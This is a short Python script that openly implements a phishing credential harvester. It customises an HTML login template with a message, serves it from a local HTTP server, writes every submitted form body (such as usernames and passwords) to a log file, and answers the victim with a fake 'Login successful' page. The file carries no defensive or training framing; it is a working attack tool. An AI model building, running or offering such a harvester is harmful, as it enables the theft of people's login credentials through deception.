from bs4 import BeautifulSoup
import requests
from http.server import SimpleHTTPRequestHandler, HTTPServer
import threading
import os
import logging

# Configure logging
logging.basicConfig(filename='phishing_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

def start_phishing_campaign(targets, message, template):
    # Select the appropriate template
    if template == 'Custom':
        template_path = os.path.join('templates', 'custom_template.html')
    else:
        template_path = os.path.join('templates', f'{template.lower()}.html')

    with open(template_path, 'r') as file:
        template = file.read()

    # Customize the template with the message
    soup = BeautifulSoup(template, 'lxml')
    soup.find('div', {'id': 'message'}).string = message
    customized_template = str(soup)

    # Save the customized template
    custom_template_path = os.path.join('templates', 'custom_template.html')
    with open(custom_template_path, 'w') as file:
        file.write(customized_template)

    # Start a local server to serve the phishing page
    class PhishingHandler(SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/':
                self.path = '/custom_template.html'
            return super().do_GET()

        def do_POST(self):
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            logging.info(f"Received data: {post_data.decode('utf-8')}")
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"Login successful")

    def run_server():
        server = HTTPServer(('localhost', 8000), PhishingHandler)
        server.serve_forever()

    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()

    print(f"Phishing page served at http://localhost:8000")
    logging.info("Phishing campaign started")